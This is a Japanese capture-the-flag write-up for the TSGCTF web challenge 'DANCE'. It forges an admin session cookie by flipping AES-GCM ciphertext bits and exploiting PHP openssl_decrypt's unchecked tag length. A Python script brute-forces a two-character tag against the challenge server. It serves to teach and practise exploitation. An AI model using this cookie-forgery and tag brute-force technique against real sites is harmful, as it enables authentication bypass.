# #DANCE:web:221pts
管理者パスワードを忘れてしまいました。パスワードを見る方法は管理者としてログインするしかないのに! デッドロックだ!  

[http://34.84.176.251:8080/](http://34.84.176.251:8080/)  

[DANCE.tar.gz](DANCE.tar.gz)  

# Solution
URLとソースが与えられる。  
guestとしてアクセスできるようだ。  
```bash
$ curl http://34.84.176.251:8080/

<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        <form action="index.php" method="POST">
            <input type="submit" name="auth" value="guest" />
        </form>
        </body>
</html>
```
index.phpを見ると、主要部分は以下のようであった。  
```php
<?php
$flag = "TSGCTF{__REDACTED__}";
if (isset($_POST["auth"])) {
    if ($_POST["auth"] == "guest") {
        $auth = "guest";
        $cipher = "aes-128-gcm";
        $key = base64_decode("__REDACTED__");
        $ivlen = openssl_cipher_iv_length($cipher);
        $iv = openssl_random_pseudo_bytes($ivlen);
        $encrypted_auth = openssl_encrypt($auth, $cipher, $key, $options = 0, $iv, $tag);
        setcookie("auth", $encrypted_auth, time() + 3600 * 24);
        setcookie("iv", base64_encode($iv), time() + 3600 * 24);
        setcookie("tag", base64_encode($tag), time() + 3600 * 24);
        header("Location: mypage.php");
    } else if (($_POST["auth"] == "admin") and isset($_POST["password"])) {
        if ($_POST["password"] == $flag) {
            $auth = "admin";
            $cipher = "aes-128-gcm";
            $key = base64_decode("__REDACTED__");
            $ivlen = openssl_cipher_iv_length($cipher);
            $iv = openssl_random_pseudo_bytes($ivlen);
            $encrypted_auth = openssl_encrypt($auth, $cipher, $key, $options = 0, $iv, $tag);
            setcookie("auth", base64_encode($encrypted_auth), time() + 3600 * 24);
            setcookie("iv", base64_encode($iv), time() + 3600 * 24);
            setcookie("tag", base64_encode($tag), time() + 3600 * 24);
            header("Location: mypage.php");
        }
    } else {
        header("Location: index.php");
    }
}
?>
~~~
```
`password`がわからないため、adminのフローには到達できない。  
guestのフローでは文字列`guest`を非公開のkeyでaes-128-gcmで暗号化している。  
その後`setcookie`で暗号文、iv、tagが渡される。  
次に、mypage.phpを見ると主要部分は以下のようであった。  
```php
<?php
if (isset($_COOKIE["auth"])) {
    $encrypted_auth = $_COOKIE["auth"];
    $iv = base64_decode($_COOKIE["iv"]);
    $tag = base64_decode($_COOKIE["tag"]);
    $cipher = "aes-128-gcm";
    $key = base64_decode("__REDACTED__");
    $auth = openssl_decrypt($encrypted_auth, $cipher, $key, $options = 0, $iv, $tag);
    $flag = "TSGCTF{__REDACTED__}";
    if ($auth == "admin") {
        $msg = "Hello admin! Password is here.\n" . $flag . "\n";
    } else if ($auth == "guest") {
        $msg = "Hello guest! Only admin can get flag.";
    } else if ($auth == "") {
        $msg = "I know you rewrote cookies!";
    } else {
        $msg = "Hello stranger! Only admin can get flag.";
    }
} else {
    header("Location: index.php");
}
?>
~~~
```
`openssl_decrypt`でindex.phpの逆の処理を行っている。  
ここで、aes-128-gcmが内部状態とのxorで構成されているため、暗号文のビットを反転すると平文のビットも反転することを思い出す。  
つまり、`暗号文 ^ guest ^ admin`を行えば、文字列`admin`を暗号化したものと一致する。  
しかし、暗号文の改竄は可能だが、tagでの検証があるため難しい。  
ユーザ入力が関係するのはこの箇所だけなので、詳細に調査する。  
[マニュアル](https://www.php.net/manual/ja/function.openssl-decrypt.php)を眺めていると以下の記述が気になる。  
```
警告
tag の長さをこの関数はチェックしません。 この値の長さは openssl_encrypt() を呼び出した時に取得できるものと一致させなければならず、それは呼び出し側の責任です。 一致しない場合でも、与えられた値が適切な tag の先頭部分と一致した場合に復号が成功するかもしれません。
```
実際に試す。  
```bash
$ curl -X POST http://34.84.176.251:8080/ -d "auth=guest" --dump-header -
~~~
Set-Cookie: auth=Kf4K844%3D; expires=Mon, 06 Nov 2023 12:02:07 GMT; Max-Age=86400
Set-Cookie: iv=AOF7azAiRHDSmEhE; expires=Mon, 06 Nov 2023 12:02:07 GMT; Max-Age=86400
Set-Cookie: tag=H50XjPwelgPE1T5q8NONHQ%3D%3D; expires=Mon, 06 Nov 2023 12:02:07 GMT; Max-Age=86400
~~~
$ curl http://34.84.176.251:8080/mypage.php -H "Cookie: auth=Kf4K844%3D;iv=AOF7azAiRHDSmEhE;tag=H50XjPwelgPE1T5q8NONHQ%3D%3D"
<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        Hello guest! Only admin can get flag.   </body>
</html>
$ curl http://34.84.176.251:8080/mypage.php -H "Cookie: auth=Kf4K844%3D;iv=AOF7azAiRHDSmEhE;tag=H5"
<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        Hello guest! Only admin can get flag.   </body>
</html>
$ curl http://34.84.176.251:8080/mypage.php -H "Cookie: auth=Kf4K844%3D;iv=AOF7azAiRHDSmEhE;tag=AA"
<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        I know you rewrote cookies!     </body>
</html>
```
tagの長さが検証されていないため、先頭が一致すれば復号されてしまっている。  
これは総当たり可能な範囲なので、改竄した暗号文を復号するtagを以下のように見つけてやる。  
```py
import requests

url = "http://34.84.176.251:8080/mypage.php"

for i in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
    for j in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789":
        try:
            # L%2B8C6ZQ%3D = base64enc(base64dec("Kf4K844%3D") ^ "guest" ^ "admin")
            res = requests.get(url, cookies={"auth": "L%2B8C6ZQ%3D", "iv": "AOF7azAiRHDSmEhE", "tag": f"{i}{j}"})
        except:
            print("Error")
            continue
        if "I know you rewrote cookies!" not in res.text:
                print(f"Found: {i}{j}")
                print(res.text)
                exit()
```
実行する。  
```bash
$ python solver.py
Found: TQ
<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        Hello admin! Password is here.
TSGCTF{Deadlock_has_been_broken_with_Authentication_bypass!_Now,_repair_website_to_reject_rewritten_CookiE.}
        </body>
</html>
```
flagが得られた。  

## TSGCTF{Deadlock_has_been_broken_with_Authentication_bypass!_Now,_repair_website_to_reject_rewritten_CookiE.}